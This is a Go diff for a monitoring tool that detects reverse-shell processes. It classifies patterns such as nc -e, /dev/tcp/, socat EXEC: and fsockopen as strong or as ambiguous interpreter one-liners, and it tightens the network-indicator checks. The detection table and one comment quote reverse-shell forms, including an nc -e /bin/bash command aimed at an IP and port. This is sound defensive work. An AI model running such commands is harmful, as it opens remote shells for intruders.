@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"os"
+	"regexp"
 	"strconv"
 	"strings"
 )
@@ -242,6 +243,22 @@ func checkEnvAccess(command string) bool {
 	return false
 }
 
+// Reverse-shell pattern classes. The class determines how Analyze escalates a
+// match and lets operators downgrade the ambiguous class via the #842
+// `[monitoring] reverse_shell_one_liners` knob without weakening the rest.
+const (
+	// ReverseShellClassStrong is the default: unambiguous reverse-shell
+	// indicators (nc -e, /dev/tcp/, socat EXEC:, fsockopen, an interactive
+	// shell, ...). Always CRITICAL — not affected by the one-liner knob.
+	ReverseShellClassStrong = ""
+	// ReverseShellClassOneLiner is an interpreter one-liner invocation
+	// (python -c, python3 -c, perl -e, ruby -e, php -r). These fire ONLY when
+	// the command also carries a real network indicator (see isNetworkRelated),
+	// but they remain the most false-positive-prone class for coding agents, so
+	// the reverse_shell_one_liners knob can downgrade them to "warn" or "off".
+	ReverseShellClassOneLiner = "oneliner"
+)
+
 // DetectReverseShells checks processes for reverse shell indicators
 func DetectReverseShells(processes []Process) []ProcessThreat {
 	var threats []ProcessThreat
@@ -249,91 +266,154 @@ func DetectReverseShells(processes []Process) []ProcessThreat {
 	reverseShellPatterns := []struct {
 		pattern    string
 		indicators []string
+		class      string
 	}{
 		// Netcat reverse shells
-		{"nc -e", []string{"netcat with exec"}},
-		{"nc.traditional -e", []string{"netcat with exec"}},
-		{"ncat -e", []string{"ncat with exec"}},
-		{"nc.openbsd -e", []string{"netcat with exec"}},
+		{"nc -e", []string{"netcat with exec"}, ReverseShellClassStrong},
+		{"nc.traditional -e", []string{"netcat with exec"}, ReverseShellClassStrong},
+		{"ncat -e", []string{"ncat with exec"}, ReverseShellClassStrong},
+		{"nc.openbsd -e", []string{"netcat with exec"}, ReverseShellClassStrong},
 
 		// Bash/sh reverse shells
-		{"bash -i", []string{"interactive bash"}},
-		{"sh -i", []string{"interactive shell"}},
-		{"/dev/tcp/", []string{"bash tcp redirect"}},
-		{"/dev/udp/", []string{"bash udp redirect"}},
+		{"bash -i", []string{"interactive bash"}, ReverseShellClassStrong},
+		{"sh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"/dev/tcp/", []string{"bash tcp redirect"}, ReverseShellClassStrong},
+		{"/dev/udp/", []string{"bash udp redirect"}, ReverseShellClassStrong},
 
-		// Python reverse shells
-		{"python -c", []string{"python one-liner"}},
-		{"python3 -c", []string{"python one-liner"}},
-		{"socket.socket", []string{"python socket"}},
+		// Python reverse shells — `python -c` / `python3 -c` are the ambiguous
+		// one-liner form; `socket.socket` is an unambiguous socket indicator.
+		{"python -c", []string{"python one-liner"}, ReverseShellClassOneLiner},
+		{"python3 -c", []string{"python one-liner"}, ReverseShellClassOneLiner},
+		{"socket.socket", []string{"python socket"}, ReverseShellClassStrong},
 
 		// Perl reverse shells
-		{"perl -e", []string{"perl one-liner"}},
-		{"perl -MIO", []string{"perl IO module"}},
+		{"perl -e", []string{"perl one-liner"}, ReverseShellClassOneLiner},
+		{"perl -MIO", []string{"perl IO module"}, ReverseShellClassStrong},
 
 		// PHP reverse shells
-		{"php -r", []string{"php one-liner"}},
-		{"fsockopen", []string{"php socket"}},
+		{"php -r", []string{"php one-liner"}, ReverseShellClassOneLiner},
+		{"fsockopen", []string{"php socket"}, ReverseShellClassStrong},
 
 		// Ruby reverse shells
-		{"ruby -rsocket", []string{"ruby socket"}},
-		{"ruby -e", []string{"ruby one-liner"}},
+		{"ruby -rsocket", []string{"ruby socket"}, ReverseShellClassStrong},
+		{"ruby -e", []string{"ruby one-liner"}, ReverseShellClassOneLiner},
 
 		// Socat reverse shells
-		{"socat", []string{"socat"}},
-		{"EXEC:", []string{"socat exec"}},
+		{"socat", []string{"socat"}, ReverseShellClassStrong},
+		{"EXEC:", []string{"socat exec"}, ReverseShellClassStrong},
 
 		// PowerShell reverse shells (if Wine/mono present)
-		{"powershell", []string{"powershell"}},
-		{"System.Net.Sockets", []string{"dotnet sockets"}},
+		{"powershell", []string{"powershell"}, ReverseShellClassStrong},
+		{"System.Net.Sockets", []string{"dotnet sockets"}, ReverseShellClassStrong},
 	}
 
 	for _, proc := range processes {
 		cmdLower := strings.ToLower(proc.Command)
 
-		for _, pattern := range reverseShellPatterns {
-			if strings.Contains(cmdLower, strings.ToLower(pattern.pattern)) {
-				// Additional check: if it's a network-related command, it's more suspicious
-				isNetworkRelated := strings.Contains(cmdLower, ":") ||
-					strings.Contains(cmdLower, "sock") || // Matches socket, fsockopen, etc.
-					strings.Contains(cmdLower, "tcp") ||
-					strings.Contains(cmdLower, "udp") ||
-					containsIPPattern(cmdLower)
+		// The interpreter one-liner patterns (python -c, perl -e, ruby -e,
+		// php -r, ...) are only a threat when the command actually carries a
+		// network indicator. Require a real one — a socket/tcp/udp keyword, an
+		// IP, or a host:port endpoint — NOT a bare ':' (issue #842): agent Bash
+		// tools wrap commands in a shell-snapshot line and quote code that
+		// almost always contains ':' (PATH entries like /usr/bin:/bin, dict
+		// literals like {"k": v}, URLs, log text), so a bare-':' check turned
+		// every agent-run `python -c` / `perl -e` / `ruby -e` / `php -r` into a
+		// kill-on-sight false positive.
+		networkRelated := isNetworkRelated(cmdLower)
 
-				if isNetworkRelated || pattern.pattern == "bash -i" || pattern.pattern == "sh -i" {
-					threats = append(threats, ProcessThreat{
-						PID:        proc.PID,
-						Command:    proc.Command,
-						User:       proc.User,
-						Pattern:    pattern.pattern,
-						Indicators: pattern.indicators,
-					})
-					break
-				}
+		// Pick the strongest matching pattern rather than the first one in the
+		// table. A command that matches an interpreter one-liner (downgradeable
+		// via the reverse_shell_one_liners knob) AND an unambiguous indicator
+		// (socket.socket, fsockopen, EXEC:, ...) must be classified STRONG, so
+		// the knob can never downgrade a genuine reverse shell that carries an
+		// always-critical indicator. Without this, table order + first-match
+		// would tag `php -r $s=fsockopen(...)` as a one-liner and "off"/"warn"
+		// would suppress it (code-review #842).
+		matched := -1
+		for i := range reverseShellPatterns {
+			p := &reverseShellPatterns[i]
+			if !strings.Contains(cmdLower, strings.ToLower(p.pattern)) {
+				continue
 			}
+			// The network-indicator gate constrains ONLY the ambiguous
+			// interpreter one-liner class (#842). Strong/unambiguous patterns
+			// (nc -e, socat, EXEC:, /dev/tcp/, an interactive shell,
+			// socket.socket, ...) are self-sufficient evidence and never require
+			// corroboration — a bare `socat EXEC:bash` carries no sock/tcp/IP
+			// token yet is unmistakably a reverse shell (code-review #842: the
+			// removed bare-':' check had been the only thing catching it).
+			if p.class == ReverseShellClassOneLiner && !networkRelated {
+				continue
+			}
+			if matched < 0 {
+				matched = i
+			}
+			if p.class == ReverseShellClassStrong {
+				matched = i
+				break // strong wins outright — stop looking
+			}
+		}
+		if matched >= 0 {
+			p := reverseShellPatterns[matched]
+			threats = append(threats, ProcessThreat{
+				PID:        proc.PID,
+				Command:    proc.Command,
+				User:       proc.User,
+				Pattern:    p.pattern,
+				Indicators: p.indicators,
+				Class:      p.class,
+			})
 		}
 	}
 
 	return threats
 }
 
-// containsIPPattern checks if command contains an IP address pattern
+// hostPortRe matches an explicit network endpoint — an IPv4 address or a
+// dotted hostname (needs a TLD-like final label) followed by ':' and a numeric
+// port. Requiring a dot in the host is what keeps it from matching dict
+// literals ({"k":1}), "hello: world", or PATH fragments (/usr/bin:/bin), which
+// is the whole point of #842's fix.
+var hostPortRe = regexp.MustCompile(`(?:\d{1,3}(?:\.\d{1,3}){3}|[a-z0-9][a-z0-9-]*(?:\.[a-z0-9-]+)+):\d{1,5}\b`)
+
+// isNetworkRelated reports whether a reverse-shell candidate command actually
+// carries a network indicator. It deliberately does NOT treat a bare ':' as an
+// indicator, nor a bare "connect" substring — both fire on benign agent
+// one-liners (e.g. db.connect(), a PATH with ':') and re-open issue #842. Real
+// reverse shells in these interpreters always carry a socket/tcp/udp keyword,
+// an IP, or a host:port endpoint alongside any connect() call.
+func isNetworkRelated(cmdLower string) bool {
+	return strings.Contains(cmdLower, "sock") || // socket, fsockopen, tcpsocket, ...
+		strings.Contains(cmdLower, "tcp") ||
+		strings.Contains(cmdLower, "udp") ||
+		containsIPPattern(cmdLower) ||
+		hostPortRe.MatchString(cmdLower)
+}
+
+// containsIPPattern reports whether the command contains a whitespace-delimited
+// dotted-quad IPv4 address (e.g. the `192.168.1.100` of `nc -e /bin/bash
+// 192.168.1.100 4444`). It matches only standalone tokens and validates each
+// octet is 0–255, so a dotted number glued into other text — a quoted version
+// string like "1.2.3.4" in a benign one-liner's output — is not mistaken for an
+// endpoint (code-review #842). IPs embedded in punctuation inside a real reverse
+// shell (e.g. a Python `("10.0.0.1",4444)` tuple) still trip isNetworkRelated
+// via the accompanying socket keyword or the host:port form.
 func containsIPPattern(cmd string) bool {
-	// Simple regex-like check for IP patterns (xxx.xxx.xxx.xxx)
-	parts := strings.Fields(cmd)
-	for _, part := range parts {
+	for _, part := range strings.Fields(cmd) {
 		octets := strings.Split(part, ".")
-		if len(octets) == 4 {
-			allNumeric := true
-			for _, octet := range octets {
-				if _, err := strconv.Atoi(octet); err != nil {
-					allNumeric = false
-					break
-				}
+		if len(octets) != 4 {
+			continue
+		}
+		valid := true
+		for _, octet := range octets {
+			n, err := strconv.Atoi(octet)
+			if err != nil || n < 0 || n > 255 {
+				valid = false
+				break
 			}
-			if allNumeric {
-				return true
-			}
+		}
+		if valid {
+			return true
 		}
 	}
 	return false
